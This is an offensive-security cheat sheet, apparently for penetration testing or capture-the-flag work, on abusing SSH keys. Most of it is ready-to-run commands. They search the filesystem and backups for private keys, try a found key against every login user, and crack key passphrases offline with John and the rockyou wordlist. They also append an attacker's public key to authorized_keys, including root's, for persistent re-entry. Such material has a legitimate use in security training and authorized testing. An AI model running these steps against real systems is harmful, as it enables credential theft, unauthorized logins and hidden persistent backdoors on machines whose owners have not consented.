# SSH Key Exploitation

## Table of Contents

1. [Overview](#overview)
2. [Finding SSH Keys](#finding-ssh-keys)
3. [Exploiting Unprotected Keys](#exploiting-unprotected-keys)
4. [Cracking Passphrase-Protected Keys](#cracking-passphrase-protected-keys)
5. [Authorized Keys Injection](#authorized-keys-injection)

---

## Overview

SSH keys are an alternative to password authentication. A **private key** (`id_rsa`, `id_ed25519`, etc.) stays on the client, a **public key** goes into `~/.ssh/authorized_keys` on the server.

If you find a private key without a passphrase, you can log in as that user with no password needed. If the key has a passphrase, you can try to crack it offline.

## Finding SSH Keys

```bash
# Common private key locations
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# Check every user's .ssh directory
ls -la /home/*/.ssh/
ls -la /root/.ssh/

# Key files to look for
/home/<user>/.ssh/id_rsa              # Private key (RSA)
/home/<user>/.ssh/id_ed25519          # Private key (Ed25519)
/home/<user>/.ssh/authorized_keys     # Which public keys can log in
/home/<user>/.ssh/known_hosts         # Which hosts this user connected to (recon)
/home/<user>/.ssh/config              # SSH client config (may reveal other hosts, users, key paths)
```

Also check backups and unusual locations — keys get copied around:
```bash
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null | xargs grep -l "PRIVATE KEY" 2>/dev/null
grep -rl "PRIVATE KEY" /tmp /var /opt /home 2>/dev/null
```

## Exploiting Unprotected Keys

A private key without a passphrase lets you log in directly.

```bash
# Check if the key has a passphrase (header says ENCRYPTED if protected)
head -5 id_rsa
# -----BEGIN RSA PRIVATE KEY-----        → no passphrase (old format)
# -----BEGIN ENCRYPTED PRIVATE KEY-----  → passphrase protected
# -----BEGIN OPENSSH PRIVATE KEY-----    → new format, need to try it to know

# Fix permissions (SSH refuses keys with loose perms)
chmod 600 id_rsa

# Connect
ssh -i id_rsa user@target

# Figure out which user the key belongs to — check authorized_keys on the target
# or try it against every user
for user in $(cat /etc/passwd | grep '/bin/bash' | cut -d: -f1); do
    ssh -i id_rsa -o BatchMode=yes $user@localhost 2>/dev/null && echo "[+] Key works for $user"
done
```

`known_hosts` is useful for **lateral movement** — it reveals which hosts this user has connected to before.

## Cracking Passphrase-Protected Keys

If the key is encrypted with a passphrase, crack it offline with John.

```bash
# Convert the key to a crackable format
ssh2john id_rsa > id_rsa.hash

# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash
```

## Authorized Keys Injection

If you can **write** to a user's `~/.ssh/authorized_keys`, you can add your own public key and log in as that user.

```bash
# On your attacker machine: generate a key pair
ssh-keygen -t ed25519 -f ./pwned -N ""

# On the target: inject your public key
echo "ssh-ed25519 AAAA...your_public_key..." >> /home/target_user/.ssh/authorized_keys

# Make sure permissions are correct (SSH is strict about this)
chmod 700 /home/target_user/.ssh
chmod 600 /home/target_user/.ssh/authorized_keys

# Connect from attacker
ssh -i ./pwned target_user@target_ip
```

This also works for **persistence** — once you have root, drop a key in `/root/.ssh/authorized_keys` for guaranteed re-entry.
